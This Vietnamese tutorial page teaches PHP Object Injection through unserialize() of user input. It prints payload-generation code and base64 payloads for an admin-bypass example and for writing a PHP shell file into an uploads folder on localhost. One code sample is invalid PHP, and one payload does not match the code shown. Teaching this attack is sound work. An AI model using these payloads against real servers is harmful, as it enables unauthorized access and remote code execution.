<main class="main has-sticky" role="main">
    <div class="content">
        <article id="post-php_object_injection/der2" class="article article-type-post" itemscope="" itemtype="http://schema.org/BlogPosting">
            <div class="article-header">
                <h1 class="article-title" itemprop="name">
                    Cách Khai Thác PHP Object Injection
                </h1>
                <div class="article-meta"><a href="?page=<?php echo $parent; ?>"><span>Back To Home</span></a>
               <?php if($src_youtube != ''){echo '<button id="introduce-btn"><img src="public/images/play-circle.png" class="img-circle img-rotate" style="height: 24px; width: 24px; margin-right: 5px" " />Hướng Dẫn</button>';} ?>
                </div>
            </div>
            <?php echo get_iframe_youtube($src_youtube); ?>
            <div class="article-entry marked-body" itemprop="articleBody">
                <h1 id="PHP-Object-Injection"><a href="#PHP-Object-Injection" class="headerlink" title="PHP Object Injection"></a>PHP Object Injection</h1>
                <p>Sau khi đã hiểu về cách serialize, unseriaze, các magic functions của PHP chạy rồi. Ta có thể dễ dàng hiểu về PHP Object Injection.</p>
                <h2 id="Cac-thuoc-tinh-cua-object-ke-tan-cong-co-the-dieu-khien"><a href="#Cac-thuoc-tinh-cua-object-ke-tan-cong-co-the-dieu-khien" class="headerlink" title="Các thuộc tính của object, kẻ tấn công có thể điều khiển."></a>Các thuộc tính của object, kẻ tấn công có thể điều khiển.</h2>
                <p>Đúng vậy, nếu ta dùng dữ liệu của người dùng để vào hàm unserialize(), thì toàn bộ các biến như:</p>
                <ul>
                    <li>private $name;</li>
                    <li>protected $age;</li>
                    <li>public $school;</li>
                </ul>
                <p>Đều có thể bị kẻ tấn công thay đổi. Có một số bạn thắc mắc vì sao đã để thuộc tính là private $name rồi mà vẫn bị hacker control.</p>
                <p>Đó là vì,dữ liệu này do kẻ tấn công cung cấp. Hắn ta hoàn toàn có thể tạo ra 1 Class tên y chang như tên Class A, các thuộc tính có tên y chang các thuộc tính Class A, cho chúng bằng với giá trị của hắn muốn rồi serialize() nó ra.</p>
                <p>Vậy kết quả của hàm serialize() hoàn toàn tương thích với Class A của server.</p>
                <h3 id="Cach-control-cac-thuoc-tinh-cua-class"><a href="#Cach-control-cac-thuoc-tinh-cua-class" class="headerlink" title="Cách control các thuộc tính của class"></a>Cách control các thuộc tính của class</h3>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">public class A(){</span><br><span class="line">    <span class="keyword">private</span> $name = <span class="string">'Hacker'</span>;</span><br><span class="line">    <span class="keyword">protected</span> $age = <span class="string">'100000'</span>;</span><br><span class="line">    <span class="keyword">public</span> $school = <span class="string">'BonBa'</span>;</span><br><span class="line">}</span><br><span class="line">$hacker_input = <span class="keyword">new</span> A();</span><br><span class="line"><span class="keyword">echo</span> serialize($hacker_input);</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Nhưng hacker chỉ dừng lại ở việc có thể control được các thuộc tính này thôi. Đó là điều PHP Object Injection cho phép hắn làm.</p>
                <h2 id="PHP-Object-Injection-loi-dung-cac-magic-functions"><a href="#PHP-Object-Injection-loi-dung-cac-magic-functions" class="headerlink" title="PHP Object Injection lợi dụng các magic functions."></a>PHP Object Injection lợi dụng các magic functions.</h2>
                <p>Kẻ tấn công sẽ lợi dụng các magic function để tấn công server. Bởi vì các magic functions sẽ được tự động gọi đến trong các trường hợp của nó diễn ra.<br>Còn trong trường hợp nào,mình đã nói ở bài trước.<br>Nếu các hàm magic functions có chức năng gì thông qua các thuộc tính của class, hắn ta sẽ dùng các chức năng đó, để mà thực hiện hành vi trái phép.</p>
                <h1 id="Vi-du-1-Bypass-logic-code"><a href="#Vi-du-1-Bypass-logic-code" class="headerlink" title="Ví dụ 1 - Bypass logic code."></a>Ví dụ 1 - Bypass logic code.</h1>
                <p>Ta có một class với magic function như sau:<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>{</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'guest'</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>{</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;username === <span class="string">'admin'</span>){</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">'Flag is here! Just admin can see!'</span>;</span><br><span class="line">            <span class="comment"># show flag</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span>{ <span class="keyword">echo</span> <span class="string">'You are user!'</span>;}</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Nhà phát triển đã để thuộc tính $username mặc định là bằng ‘guest’, và nó cũng là thuộc tính private luôn rồi.</p>
                <p>Cũng không có các hàm setter hay getter gì để có thể thay đổi được $username, do đó nhà phát triển cảm thấy rất yên tâm về nó.</p>
                <h2 id="Cung-khai-thac-nao"><a href="#Cung-khai-thac-nao" class="headerlink" title="Cùng khai thác nào."></a>Cùng khai thác nào.</h2>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'submit'</span>])){</span><br><span class="line">        $user_input = $_GET[<span class="string">'data'</span>];</span><br><span class="line">        $ob = unserialize(base64_decode($user_input));</span><br><span class="line">    }</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Ở một đoạn code của chức năng khác, lại cho chúng ta có thể unserialize một user input tuỳ ý.</p>
                <h2 id="Tao-payload"><a href="#Tao-payload" class="headerlink" title="Tạo payload"></a>Tạo payload</h2>
                <p>Hãy chạy bằng PHP Editor online,hoặc tạo 1 file php local để tạo ra payload.<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>{</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">'admin'</span>;</span><br><span class="line">}</span><br><span class="line">$hack = <span class="keyword">new</span> user();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($hack));</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Ta được đoạn payload sau:</p>
                <blockquote>
                    <p>Tzo0OiJ1c2VyIjoxOntzOjE0OiIAdXNlcgB1c2VybmFtZSI7czo1OiJhZG1pbiI7fQ==</p>
                </blockquote>
                <p>Qua ví dụ trên, ta thấy có thể gọi được class user với thuộc tính tuỳ ý. Với điều kiện xử lý trong hàm magic trường hợp này là wakeup().</p>
                <h1 id="Vi-du-2-Upload-shell"><a href="#Vi-du-2-Upload-shell" class="headerlink" title="Ví dụ 2 - Upload shell."></a>Ví dụ 2 - Upload shell.</h1>
                <p>Có rất nhiều trường hợp,ta có thể ghi file với deserialize, bởi vì ở các hàm magic functions, người ta hay để các hàm có thể ghi log.</p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_login</span></span>{</span><br><span class="line">    <span class="keyword">private</span> $log_file = <span class="string">'log/log.txt'</span>;</span><br><span class="line">    <span class="keyword">private</span> $username;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>{</span><br><span class="line">        file_put_contents(<span class="keyword">$this</span>-&gt;log_file,<span class="string">'User '</span>.<span class="keyword">$this</span>-&gt;username.<span class="string">' log in!'</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p>Mỗi khi class user_login được khởi tạo đối tượng, thì máy chủ sẽ ghi log lại rằng user đó đã login vào file log/log.txt.</p>
                <p>Vì ta có thể điều khiển được các thuộc tính này, nên ta có thể:</p>
                <ul>
                    <li>Sửa lại $log_file để chỉnh sửa nơi ghi nội dung.</li>
                    <li>Sửa lại $username để ghi shell php vào file shell.</li>
                </ul>
                <h2 id="Tao-payload-1"><a href="#Tao-payload-1" class="headerlink" title="Tạo payload"></a>Tạo payload</h2>
                <p>Hãy chạy bằng PHP Editor online,hoặc tạo 1 file php local để tạo ra payload.<br></p>
                <figure class="highlight php">
                    <table>
                        <tbody>
                        <tr>
                            <td class="gutter">
                                <pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre>
                            </td>
                            <td class="code">
                                <pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user_login</span></span>{</span><br><span class="line">    <span class="keyword">private</span> $username = <span class="string">"&lt;?php phpinfo(); ?&gt;"</span>;</span><br><span class="line">    <span class="keyword">private</span> $log_file = <span class="string">'../../../uploads/shell.php'</span>;</span><br><span class="line">}</span><br><span class="line">$hack = <span class="keyword">new</span> user_login();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(serialize($hack));</span><br></pre>
                            </td>
                        </tr>
                        </tbody>
                    </table>
                </figure>
                <p></p>
                <p>Ta nhận được payload.</p>
                <blockquote>
                    <p>TzoxMDoidXNlcl9sb2dpbiI6Mjp7czoyMDoiAHVzZXJfbG9naW4AdXNlcm5hbWUiO3M6MTk6Ijw/cGhwIHBocGluZm8oKTsgPz4iO3M6MjA6IgB1c2VyX2xvZ2luAGxvZ19maWxlIjtzOjM5OiJDOlx4YW1wcFxodGRvY3NcZmluYWxcdXBsb2Fkcy9zaGVsbC5waHAiO30=</p>
                </blockquote>
                <p>Sau khi ghi file thành công, ta thử vào:</p>
                <blockquote>
                    <p><a href="http://localhost/uploads/shell.php">http://localhost/uploads/shell.php</a></p>
                </blockquote>
                <h2 id="Thanh-cong"><a href="#Thanh-cong" class="headerlink" title="Thành công!"></a>Thành công!</h2>
            </div>

        </article>
        <?php
        if(isset($_GET['change_status'])){
            if($_GET['change_status'] == 1){
                change_status($id_post);
            }
        }
        echo print_footer_status($id_post,$title);
        ?>
        <section id="comments">
            <div id="vcomments"></div>
        </section>
    </div>

</main>